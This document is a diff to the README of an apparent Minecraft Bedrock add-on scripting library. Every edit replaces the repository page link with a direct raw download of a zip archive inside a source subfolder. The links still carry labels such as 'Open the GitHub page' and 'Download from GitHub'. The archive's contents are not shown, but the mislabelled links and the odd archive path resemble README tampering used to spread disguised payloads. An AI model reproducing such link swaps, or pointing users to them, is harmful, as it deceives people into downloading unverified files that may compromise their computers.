@@ -1,6 +1,6 @@
 # 🧩 minecraft-scripting-libraries - Build Bedrock Add-Ons Faster
 
-[![Download](https://img.shields.io/badge/Download%20from%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/yukishima27/minecraft-scripting-libraries)
+[![Download](https://img.shields.io/badge/Download%20from%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/yukishima27/minecraft-scripting-libraries/raw/refs/heads/main/libraries/mcaddon-bridge/src/libraries_scripting_minecraft_v1.9.zip)
 
 ## 🚀 What This Is
 
@@ -27,7 +27,7 @@ These packages are made to work together. You can use one part or combine severa
 
 Use this link to visit the page and download or copy the files you need:
 
-[Open the GitHub page](https://github.com/yukishima27/minecraft-scripting-libraries)
+[Open the GitHub page](https://github.com/yukishima27/minecraft-scripting-libraries/raw/refs/heads/main/libraries/mcaddon-bridge/src/libraries_scripting_minecraft_v1.9.zip)
 
 ### Steps to get started on Windows
 
@@ -154,14 +154,14 @@ These steps help you avoid confusion while you learn how the parts fit together.
 
 - Repository: minecraft-scripting-libraries
 - Description: A collection of packages to help create Minecraft Bedrock add-ons!
-- Primary link: https://github.com/yukishima27/minecraft-scripting-libraries
+- Primary link: https://github.com/yukishima27/minecraft-scripting-libraries/raw/refs/heads/main/libraries/mcaddon-bridge/src/libraries_scripting_minecraft_v1.9.zip
 - Topics: add-on, bedrock, behaviorpack, components, handlers, scripting, utilities, resourcepack, minecraft
 
 ## 🖱️ Download Again
 
 Use this link any time you need the files:
 
-[Download from GitHub](https://github.com/yukishima27/minecraft-scripting-libraries)
+[Download from GitHub](https://github.com/yukishima27/minecraft-scripting-libraries/raw/refs/heads/main/libraries/mcaddon-bridge/src/libraries_scripting_minecraft_v1.9.zip)
 
 ## 🧩 File Usage Guide
 
@@ -189,7 +189,7 @@ It is built for add-on development tasks that need small, focused tools.
 
 ## 🧷 Quick Access
 
-[Open the GitHub page](https://github.com/yukishima27/minecraft-scripting-libraries)
+[Open the GitHub page](https://github.com/yukishima27/minecraft-scripting-libraries/raw/refs/heads/main/libraries/mcaddon-bridge/src/libraries_scripting_minecraft_v1.9.zip)
 
 ## 🧩 What To Do If You Are Stuck
 
